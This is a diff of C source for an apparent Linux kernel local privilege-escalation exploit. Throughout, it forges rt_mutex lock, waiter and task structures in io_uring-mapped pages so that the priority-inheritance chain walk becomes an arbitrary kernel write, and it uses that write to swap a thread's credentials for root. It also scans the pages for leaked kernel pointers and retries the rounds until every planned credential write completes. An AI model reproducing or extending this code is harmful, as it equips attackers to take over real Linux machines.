@@ -116,42 +116,48 @@ void ghost_apply_next_plan(int completed_walks) {
   /* In cred mode, walk 1 targets the CONSUMER thread's cred (the consumer
    * can make syscalls post-walk, unlike the main thread). Override the
    * plan's target if the consumer leaked its own task. */
-  if (pselect_custom_write == 6 && g_consumer_task) {
+  if (write_mode_is_cred(pselect_custom_write) && g_consumer_task) {
     pc = (g_consumer_task + TASK15_CRED_OFF - 8) | 1;
     char m[96];
     int n = snprintf(m, sizeof(m), "[PLAN] retarget walk 1 -> consumer cred %016lx\n",
                      (unsigned long)(g_consumer_task + TASK15_CRED_OFF));
     write(1, m, n);
   }
-  for (int m = 0; m < uring_count; m++) {
-    uint8_t *page = (uint8_t *)uring_maps[m];
-    /* Re-arm pi_tree_entry for the write primitive */
-    put64(page, W0_OFF + 0x18, pc);            /* pi_tree_entry.pc = new target */
-    put64(page, W0_OFF + 0x20, pl->rb_right);  /* pi_tree_entry.rb_right = value */
-    put64(page, W0_OFF + 0x28, 0);             /* pi_tree_entry.rb_left = NULL */
-    /* Re-arm tree_entry (lock->waiters tree node) */
-    put64(page, W0_OFF + 0x00, 0);             /* tree_entry.pc = black root */
-    put64(page, W0_OFF + 0x08, 0);             /* tree_entry.rb_right = NULL */
-    put64(page, W0_OFF + 0x10, 0);             /* tree_entry.rb_left = NULL */
-    /* Re-arm lock->waiters tree roots */
-    put64(page, LOCK_OFF + 0x08, fake_w0);     /* lock->waiters.rb_root = W0.tree_entry */
-    put64(page, LOCK_OFF + 0x10, fake_w0);     /* lock->waiters.rb_leftmost = W0 */
-    /* Re-arm lock->owner = fake_task|1. The quiesce between overlay
-     * rounds zeroes it; without the owner the next walk's [9] check
-     * (`if (!rt_mutex_owner(lock)) return 0`) ends the chain cleanly
-     * BEFORE the [10]-[11] owner walk -- the erase never fires (observed:
-     * [WALKCHK 0] NOT FOUND, dur=69us, no crash). */
-    put64(page, LOCK_OFF + 0x18, fake_task | 1);
-    /* Re-arm fake_task->pi_waiters: walk 0's enqueue_pi inserted the stack
-     * waiter, so pi_waiters now points to kernel stack data. Reset it so
-     * walk 1's dequeue_pi erases W0 (our controlled node), not the stack waiter. */
-    put64(page, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, fake_w0 + 0x18);
-    put64(page, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8, fake_w0 + 0x18);
-    /* W0.prio must be WORSE than every rung so S always displaces W0
-     * as the top waiter, triggering the owner-update (= our write). */
-    put32(page, W0_OFF + 0x44, 139);
-    /* Reset W0.task to fake_task (walk 0 might have changed it) */
-    put64(page, W0_OFF + 0x30, fake_task);
+  for (int m = 0; m < uring_count && m < URING_MAX; m++) {
+    size_t mapsz = uring_mapsz[m] ? uring_mapsz[m] : MM_SLAB_SIZE;
+    if (mapsz < MM_SLAB_SIZE)
+      continue;
+    size_t nblocks = mapsz / MM_SLAB_SIZE;
+    for (size_t blk = 0; blk < nblocks; blk++) {
+      uint8_t *page = (uint8_t *)uring_maps[m] + blk * MM_SLAB_SIZE;
+      /* Re-arm pi_tree_entry for the write primitive */
+      put64(page, W0_OFF + 0x18, pc);            /* pi_tree_entry.pc = new target */
+      put64(page, W0_OFF + 0x20, pl->rb_right);  /* pi_tree_entry.rb_right = value */
+      put64(page, W0_OFF + 0x28, 0);             /* pi_tree_entry.rb_left = NULL */
+      /* Re-arm tree_entry (lock->waiters tree node) */
+      put64(page, W0_OFF + 0x00, 0);             /* tree_entry.pc = black root */
+      put64(page, W0_OFF + 0x08, 0);             /* tree_entry.rb_right = NULL */
+      put64(page, W0_OFF + 0x10, 0);             /* tree_entry.rb_left = NULL */
+      /* Re-arm lock->waiters tree roots */
+      put64(page, LOCK_OFF + 0x08, fake_w0);     /* lock->waiters.rb_root = W0.tree_entry */
+      put64(page, LOCK_OFF + 0x10, fake_w0);     /* lock->waiters.rb_leftmost = W0 */
+      /* Re-arm lock->owner = fake_task|1. The quiesce between overlay
+       * rounds zeroes it; without the owner the next walk's [9] check
+       * (`if (!rt_mutex_owner(lock)) return 0`) ends the chain cleanly
+       * BEFORE the [10]-[11] owner walk -- the erase never fires (observed:
+       * [WALKCHK 0] NOT FOUND, dur=69us, no crash). */
+      put64(page, LOCK_OFF + 0x18, fake_task | 1);
+      /* Re-arm fake_task->pi_waiters: walk 0's enqueue_pi inserted the stack
+       * waiter, so pi_waiters now points to kernel stack data. Reset it so
+       * walk 1's dequeue_pi erases W0 (our controlled node), not the stack waiter. */
+      put64(page, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, fake_w0 + 0x18);
+      put64(page, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8, fake_w0 + 0x18);
+      /* W0.prio must be WORSE than every rung so S always displaces W0
+       * as the top waiter, triggering the owner-update (= our write). */
+      put32(page, W0_OFF + 0x44, 139);
+      /* Reset W0.task to fake_task (walk 0 might have changed it) */
+      put64(page, W0_OFF + 0x30, fake_task);
+    }
   }
 }
 
@@ -517,7 +523,7 @@ void do_pselect_fake_lock_route(void) {
        * re-spray: the page is verified live; re-spraying would only
        * re-roll the reclaim dice. */
       int retry_same_page =
-          pselect_custom_write == 6 && page_base &&
+          write_mode_is_cred(pselect_custom_write) && page_base &&
           atomic_load(&consumer_erase_hits) > 0 &&
           atomic_load(&consumer_erase_hits) < g_write_plan_count &&
           consumer_nice_headroom();
@@ -785,7 +791,7 @@ void do_pselect_fake_lock_route(void) {
 
     int route_signal = calls > 0;
 
-    if (pselect_custom_write == 6 && success > 0) {
+    if (write_mode_is_cred(pselect_custom_write) && success > 0) {
       g_route_write_ok = 1;
       /* Marker only -- NEVER exit_group here. The main thread must stay
        * alive to observe the cred swap through getuid() and exec() the
@@ -822,14 +828,15 @@ void do_pselect_fake_lock_route(void) {
        * orders because the discarded page can merge with its buddy). */
       uint8_t *real_page = NULL;
       int walk_ran = 0;
-      for (int m = 0; m < uring_count && !real_page; m++) {
-        uint8_t *page = (uint8_t *)uring_maps[m];
-        uint64_t leftmost = *(uint64_t *)(page + LOCK_OFF + 0x10);
+      for (int bi = 0; ; bi++) {
+        uint8_t *pg = uring_block(bi);
+        if (!pg) break;
+        uint64_t leftmost = *(uint64_t *)(pg + LOCK_OFF + 0x10);
         if (leftmost != (uint64_t)fake_w0) {
-          real_page = page;
+          real_page = pg;
           walk_ran = 1;
-          pr_info("=== uring readback: mapping %d/%d is the mm page (walk effects present) ===\n",
-                  m, uring_count);
+          pr_info("=== uring readback: payload block %d shows walk effects (this block IS the mm page) ===\n",
+                  bi);
           break;
         }
       }
@@ -865,8 +872,9 @@ void do_pselect_fake_lock_route(void) {
             if (!dup) payload_kptrs[n_payload_kptrs++] = v;
           }
         }
-        for (int m = 0; m < uring_count && !real_page; m++) {
-          uint8_t *pg = (uint8_t *)uring_maps[m];
+        for (int bi = 0; !real_page; bi++) {
+          uint8_t *pg = uring_block(bi);
+          if (!pg) break;
           for (size_t off = 0; off + 8 <= MM_SLAB_SIZE; off += 8) {
             uint64_t v = *(uint64_t *)(pg + off);
             if ((v >> 40) != 0xffffff)
@@ -875,9 +883,9 @@ void do_pselect_fake_lock_route(void) {
             for (int k = 0; k < n_payload_kptrs; k++)
               if (payload_kptrs[k] == v) { known = 1; break; }
             if (!known) {
-              pr_info("=== SQE readback: ring %d/%d holds foreign kernel ptr "
+              pr_info("=== SQE readback: block %d holds foreign kernel ptr "
                       "at +%04zx: %016llx (kernel sees THIS page as the mm page) ===\n",
-                      m, uring_count, off, (unsigned long long)v);
+                      bi, off, (unsigned long long)v);
               real_page = pg;
               walk_ran = 1;
               break;
@@ -885,7 +893,7 @@ void do_pselect_fake_lock_route(void) {
           }
         }
         if (!real_page) {
-          real_page = uring_count > 0 ? (uint8_t *)uring_maps[0] : skb_readback_buf(0);
+          real_page = uring_block(0);
           pr_info("=== readback: NO page shows walk effects (walk did not run, or it ran on a page we did not capture) ===\n");
         }
       }
@@ -934,11 +942,11 @@ void do_pselect_fake_lock_route(void) {
                 (unsigned long long)st,
                 (unsigned long long)(page_base + SELFTEST_VALUE),
                 g_route_write_ok ? "VERIFIED" : "FAILED");
-      } else if (walk_ran && pselect_custom_write == 6) {
-        g_route_write_ok = calls >= g_write_plan_count;
-        pr_info("  cred swap: walk ran on %d/%d walks => cred pointer write %s\n",
-                calls, g_write_plan_count,
-                g_route_write_ok ? "SENT" : "INCOMPLETE");
+      } else if (walk_ran && write_mode_is_cred(pselect_custom_write)) {
+        g_route_write_ok = atomic_load(&consumer_erase_hits) >= g_write_plan_count;
+        pr_info("  cred swap: erases %d/%d (walks ran: %d) => cred pointer writes %s\n",
+                atomic_load(&consumer_erase_hits), g_write_plan_count, calls,
+                g_route_write_ok ? "COMPLETE" : "INCOMPLETE");
       } else if (walk_ran && ghost_test != 1) {
         g_route_write_ok = 1;
       }
@@ -957,13 +965,14 @@ void do_pselect_fake_lock_route(void) {
     }
 
     if (route_signal) {
-      if (pselect_custom_write == 5 || pselect_custom_write == 6) {
-        /* Modes 5/6: generic write / cred swap - no fops redirect, the
+      if (pselect_custom_write == 5 ||
+          write_mode_is_cred(pselect_custom_write)) {
+        /* Modes 5/6/7: generic write / cred swap - no fops redirect, the
          * route is verified purely by the SQE readback above. In cred
          * mode, if planned erases are still pending and the nice ladder
          * has headroom, do a same-page overlay retry round instead of
          * declaring the route done (see the attempt-loop head). */
-        if (pselect_custom_write == 6 &&
+        if (write_mode_is_cred(pselect_custom_write) &&
             atomic_load(&consumer_erase_hits) > 0 &&
             atomic_load(&consumer_erase_hits) < g_write_plan_count &&
             consumer_nice_headroom()) {
